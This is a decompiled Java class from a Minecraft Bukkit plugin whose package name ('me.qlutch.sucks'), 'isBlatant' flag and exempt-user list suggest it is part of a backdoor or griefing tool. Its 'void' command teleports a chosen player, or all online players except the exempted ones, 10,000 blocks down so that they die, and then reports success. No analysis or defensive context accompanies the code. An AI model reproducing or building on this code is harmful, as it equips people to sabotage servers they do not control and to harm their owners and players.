/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 *  org.bukkit.plugin.Plugin
 */
package me.qlutch.sucks.command.impl;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;

import java.util.concurrent.ExecutionException;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;

/*
 * Illegal identifiers - consider using --renameillegalidents true
 */
public class VoidCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (args.length <= 1) {
            p2.sendMessage(Settings.USAGE("void <player>"));
        } else if (args[1].equals("*")) {
            for (Player a2 : Bukkit.getOnlinePlayers()) {
                if (plugin.lite.contains(a2.getName())) continue;
                plugin.getServer().getScheduler().runTaskAsynchronously((Plugin)plugin, () -> {
                    try {
                        Bukkit.getScheduler().callSyncMethod((Plugin)plugin, () -> a2.teleport(a2.getLocation().subtract(0.0, 10000.0, 0.0))).get();
                    }
                    catch (InterruptedException | ExecutionException exception) {
                        // empty catch block
                    }
                });
            }
            p2.sendMessage(Settings.PREFIX("Everyone was sent to the void!"));
        } else {
            Player target = Bukkit.getServer().getPlayer(args[1]);
            if (target == null) {
                p2.sendMessage(Settings.PREFIX("The player " + Settings.RED + args[1] + Settings.WHITE + " is not online."));
            } else {
                plugin.getServer().getScheduler().runTaskAsynchronously((Plugin)plugin, () -> {
                    try {
                        Bukkit.getScheduler().callSyncMethod((Plugin)plugin, () -> target.teleport(target.getLocation().subtract(0.0, 10000.0, 0.0))).get();
                    }
                    catch (InterruptedException | ExecutionException exception) {
                        // empty catch block
                    }
                });
                p2.sendMessage(Settings.PREFIX("The player " + Settings.RED + target.getName() + Settings.WHITE + " was sent to the void!"));
            }
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }


}

